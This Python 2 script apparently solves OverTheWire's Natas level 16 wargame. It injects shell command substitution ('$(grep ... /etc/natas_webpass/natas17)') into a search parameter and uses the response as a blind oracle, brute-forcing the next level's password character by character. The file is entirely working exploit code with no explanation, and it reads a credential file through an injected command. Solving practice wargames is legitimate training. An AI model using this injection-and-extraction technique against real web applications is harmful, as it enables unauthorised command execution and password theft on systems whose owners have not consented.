#! /usr/bin/python

import requests
import re

username = 'natas16'
password = ''

allChars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
parsedChars = ''
natas17pw = ''
debug = 0
existsStr = 'Output:\n<pre>\n</pre>'

if debug == 1 :
	print 'test char in password : '
for c in allChars :
	if debug == 1 :
		print c,
	payload = '?needle=$(grep ' + c + ' /etc/natas_webpass/natas17)whacked'
	r = requests.get('http://natas16.natas.labs.overthewire.org/index.php' + payload, auth=(username, password))
	if r.content.find(existsStr) != -1 :
		parsedChars += c;
		if debug == 1 :
			print '\nFound : ' + parsedChars
if debug == 1 :
	print '\n'

for local in range(1, 33) :
	if debug == 1 :
		print 'local : ' + str(local) + ', char :',
	for c in parsedChars :
		if debug == 1 :
			print c,
		payload = '?needle=$(grep ^' + natas17pw + c + ' /etc/natas_webpass/natas17)whacked'
		r = requests.get('http://natas16.natas.labs.overthewire.org/index.php' + payload, auth=(username, password))
		if r.content.find(existsStr) != -1 :
			natas17pw += c;
			if debug == 1 :
				print '\nFound : ' + natas17pw
			break

print natas17pw
